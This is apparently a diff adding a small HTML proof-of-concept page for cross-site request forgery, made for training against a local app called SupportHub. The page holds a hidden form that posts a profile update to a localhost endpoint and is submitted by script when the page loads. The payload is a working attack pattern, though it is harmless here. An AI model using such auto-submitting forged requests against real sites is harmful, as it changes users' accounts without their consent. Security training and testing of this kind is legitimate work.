@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF Proof of Concept</title>
+</head>
+<body>
+  <h1>External Training Page</h1>
+  <p>Submitting a cross-origin profile update...</p>
+
+  <form
+    id="csrfForm"
+    action="http://127.0.0.1:3000/api/profile/update"
+    method="POST"
+  >
+    <input
+      type="hidden"
+      name="jobTitle"
+      value="CSRF Proof Confirmed"
+    >
+  </form>
+
+  <script>
+    // Automatically submits a request to SupportHub.
+    document.getElementById('csrfForm').submit();
+  </script>
+</body>
+</html>
